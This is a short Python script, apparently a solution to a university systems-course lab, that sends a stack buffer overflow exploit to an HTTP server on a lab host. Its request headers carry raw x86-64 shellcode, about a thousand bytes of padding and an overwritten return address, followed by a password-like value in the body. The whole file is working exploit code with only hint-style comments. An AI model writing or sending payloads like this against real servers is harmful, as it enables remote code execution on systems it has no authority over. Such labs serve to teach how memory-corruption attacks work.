import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')
    
# Method should always be get
METHOD = b"GET"

PORT = random.randint(10000, 10025)

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)
CODE = b"\x48\xc7\xc0\x0b\x32\x40\x00\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x7d\x2f\x40\x00\xff\xd0"

N = 0x3f0
PADDING = b"\xff" * (N - len(CODE))

# Fill this in with the address you actually want instead of `0xdeadbeef`
ADDRESS = to_bytes(0x58585590)

# The "exploit string" is what we send in as the headers
HEADERS = CODE + PADDING + ADDRESS

# The functions we call will often look in the request's data for a password.
# So, we send it here.
DATA = b"e6c6015f86"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b" " + b"HTTP/1.1\r\n" + HEADERS + b"\r\nConnection: close\r\n\r\n" + DATA
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
